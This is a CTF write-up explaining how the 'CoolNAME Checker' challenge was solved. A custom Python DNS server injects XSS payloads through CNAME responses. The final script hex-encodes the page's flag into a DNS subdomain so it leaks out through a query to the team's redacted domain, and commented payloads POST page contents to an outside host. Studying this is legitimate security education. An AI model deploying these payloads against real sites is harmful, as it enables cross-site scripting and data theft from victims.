# CoolNAME Checker [324 points] (19 solves)

Files:

 - This challenge provided a [link](http://reverse-lookup.hackable.software)

## Part 0: research

The website allows us to enter an IP and the server will make a DNS request to it (judging from the name it's going to be a CNAME DNS query). Below is a quick nonce solver we used, which was executed with a simple JS script in console.

```js
const nonce = document.querySelector('input[name="nonce"]').value;
fetch('https://%REDACTED%', { method: 'POST', body: nonce })
    .then(res => res.text())
    .then(res => document.querySelector('input[name="pow"]').value = res);
document.querySelector('input[name="srv"]').value = "%REDACTED%";
```

The button *show to admin* hinted at an XSS vuln. We ran a simple python DNS server from [here](https://gist.github.com/samuelcolvin/ca8b429504c96ee738d62a798172b046). This allowed us to return arbitrary responses quite easily.

```python
from time import sleep

from dnslib import RR
from dnslib.server import DNSServer


#PAYLOAD = '<script>fetch(\'%REDACTED\',{body:document.body.innerHTML,method:\'POST\'})</script>'
#PAYLOAD = '<script/src=\'%REDACTED%\'></script>'
PAYLOAD = '<img/src=\'%REDACTED%\'>'

class Resolver:
    def resolve(self, request, handler):
        reply = request.reply()
        resname = str(request.q.qname)[:-1]
        reply.add_answer(*RR.fromZone(resname + ' 2137 CNAME ' + PAYLOAD))
        return reply

if __name__ == '__main__':
    resolver = Resolver()
    s = DNSServer(resolver, port=53, address='0.0.0.0', tcp=False)
    s.start_thread()

    try:
        while 1:
            sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        s.stop()
```

## Part 1: solution

We quickly realised, that above payloads worked on local side - meaning that XSS was working, but we couldn't get admin to hit our requestbin. On top of that, payload couldn't contain spaces.

It took us quite some time to read challenge carefully. *Only udp/53 outgoing traffic allowed from server*. That meant we needed to smuggle flag in a DNS query.

Final payload:

```html
<script>window.location=('http://'+document.getElementById('flag').innerHTML.substr(14).split('').reduce((hex,c)=>hex+=c.charCodeAt(0).toString(16),'').substr(0,60)+'.%REDACTED%')</script>
```

Flag: `DrgnS{MustLuuuuvDNS_dontYa}`
